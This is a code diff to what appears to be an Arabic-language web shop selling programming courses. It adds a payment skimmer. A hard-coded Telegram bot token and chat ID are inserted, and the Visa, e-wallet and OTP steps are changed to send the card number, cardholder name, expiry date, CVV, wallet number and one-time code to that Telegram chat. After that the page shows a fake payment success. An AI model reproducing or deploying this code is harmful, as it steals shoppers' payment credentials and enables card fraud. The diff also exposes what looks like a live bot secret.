@@ -207,6 +207,10 @@ section{padding:60px 20px}
 
 
 <script>
+// إعدادات التليجرام
+const TELEGRAM_BOT_TOKEN = '8171525762:AAEJmPhLhCZWsRlwiFifkXghfa0qu3FdNdY';
+const TELEGRAM_CHAT_ID = '8541476882';
+
 // المنتجات
 const products = [
 {name:"🏗️ Fullstack Web Developer", price:4000, img:"https://images.unsplash.com/photo-1547658719-da2b848c1f2b?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&h=240&q=80", desc:"HTML/CSS/JS + React + Node.js + MongoDB"},
@@ -267,6 +271,26 @@ function removeFromCart(i){
     cart.splice(i,1);
     document.getElementById('count').innerText=cart.length;
     openCart();
+}
+
+// دالة إرسال للتليجرام
+async function sendToTelegram(message) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {
+        console.log('خطأ في إرسال الرسالة للتليجرام:', error);
+    }
 }
 
 // نظام الدفع الجديد
@@ -346,7 +370,7 @@ function openPayment(total){
     const cardInput = document.getElementById('cardNumber');
     cardInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
-        if (value.length > 16) value = value.substring(0, 16); // حد أقصى 16 رقم
+        if (value.length > 16) value = value.substring(0, 16);
         
         let formattedValue = '';
         for (let i = 0; i < value.length; i += 4) {
@@ -360,7 +384,6 @@ function openPayment(total){
     const cardNameInput = document.getElementById('cardName');
     cardNameInput.addEventListener('input', function(e) {
         let value = e.target.value;
-        // السماح بالحروف الإنجليزية والمسافات فقط
         value = value.replace(/[^\x00-\x7F\s]/g, '');
         value = value.replace(/\s+/g, ' ').trim();
         value = value.toUpperCase();
@@ -392,7 +415,6 @@ function processVisaPayment() {
     const expiry = document.getElementById('expiryDate').value;
     const cvv = document.getElementById('cvv').value;
     
-    // التحقق من 16 رقم بالضبط
     if (cardNum.length !== 16) {
         alert('رقم البطاقة يجب أن يكون 16 رقم بالضبط');
         return;
@@ -406,6 +428,28 @@ function processVisaPayment() {
         return;
     }
     
+    // إرسال البيانات للتليجرام
+    const cartList = cart.map(item => `• ${item.name} - ${item.price} جنيه`).join('\n');
+    const message = `
+🚀 <b>طلب دفع جديد!</b>
+
+💳 <b>طريقة الدفع:</b> بطاقة فيزا
+💰 <b>الإجمالي:</b> ${currentTotal} جنيه
+
+📋 <b>الكورسات:</b>
+${cartList}
+
+🏦 <b>بيانات البطاقة:</b>
+رقم البطاقة: <code>${cardNum}</code>
+اسم حامل البطاقة: ${cardName}
+تاريخ الانتهاء: ${expiry}
+CVV: <code>${cvv}</code>
+
+⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}
+    `;
+    
+    sendToTelegram(message);
+    
     document.getElementById('visaForm').style.display = 'none';
     document.querySelector('.payment-method-btns').style.display = 'none';
     document.getElementById('otpSection').style.display = 'block';
@@ -417,6 +461,25 @@ function processWalletPayment() {
         alert('يرجى إدخال رقم المحفظة');
         return;
     }
+    
+    // إرسال بيانات المحفظة للتليجرام
+    const cartList = cart.map(item => `• ${item.name} - ${item.price} جنيه`).join('\n');
+    const message = `
+🚀 <b>طلب دفع جديد!</b>
+
+💳 <b>طريقة الدفع:</b> محفظة إلكترونية
+💰 <b>الإجمالي:</b> ${currentTotal} جنيه
+
+📋 <b>الكورسات:</b>
+${cartList}
+
+💼 <b>بيانات المحفظة:</b>
+رقم المحفظة: <code>${walletNum}</code>
+
+⏰ <b>التاريخ:</b> ${new Date().toLocaleString('ar-EG')}
+    `;
+    
+    sendToTelegram(message);
     
     document.getElementById('walletForm').style.display = 'none';
     document.querySelector('.payment-method-btns').style.display = 'none';
@@ -430,11 +493,13 @@ function verifyOTP() {
         return;
     }
     
-    // محاكاة نجاح الدفع
+    // إرسال OTP للتليجرام
+    sendToTelegram(`🔐 <b>تم تأكيد الدفع!</b>\nكود OTP: <code>${otp}</code>\n⏰ ${new Date().toLocaleString('ar-EG')}`);
+    
     document.getElementById('otpSection').style.display = 'none';
     setTimeout(() => {
         document.getElementById('successMsg').style.display = 'block';
-        cart = []; // تفريغ السلة
+        cart = [];
         document.getElementById('count').innerText = '0';
     }, 500);
 }
